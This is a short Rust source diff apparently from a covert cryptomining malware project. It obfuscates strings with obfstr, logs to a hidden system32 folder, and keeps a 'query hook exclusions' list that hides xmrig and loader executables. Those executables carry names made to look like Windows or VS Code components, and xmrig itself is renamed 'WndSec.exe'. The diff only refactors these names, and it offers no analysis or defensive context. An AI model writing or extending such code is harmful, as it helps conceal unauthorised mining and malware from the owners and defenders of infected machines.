@@ -1,6 +1,9 @@
 use std::path::PathBuf;
 use obfstr::obfstr as s;
-use shared::utils::functions::{ programdata_dir, system32_dir };
+use shared::{
+    constants::{ client_exe_name, system_loader_exe_name, vscode_initial_loader_exe_name },
+    utils::functions::{ programdata_dir, system32_dir },
+};
 
 pub fn log_directory() -> PathBuf {
     system32_dir().join(s!("sppn"))
@@ -8,11 +11,10 @@ pub fn log_directory() -> PathBuf {
 
 pub fn default_query_hook_exclusions() -> Vec<String> {
     vec![
-        s!("xmrig.exe").to_owned(),
-        s!("WinHandler64.exe").to_owned(),
-        s!("SharedDataPolicy.exe").to_owned(),
-        s!("llvm86.exe").to_owned(),
-        s!("WndSec.exe").to_owned()
+        xmrig_exe_name(),
+        vscode_initial_loader_exe_name(),
+        system_loader_exe_name(),
+        client_exe_name()
     ]
 }
 
@@ -34,4 +36,7 @@ pub fn client_tag() -> String {
 
 pub fn client_version() -> u64 {
     1
+}
+pub fn xmrig_exe_name() -> String {
+    s!("WndSec.exe").to_owned()
 }
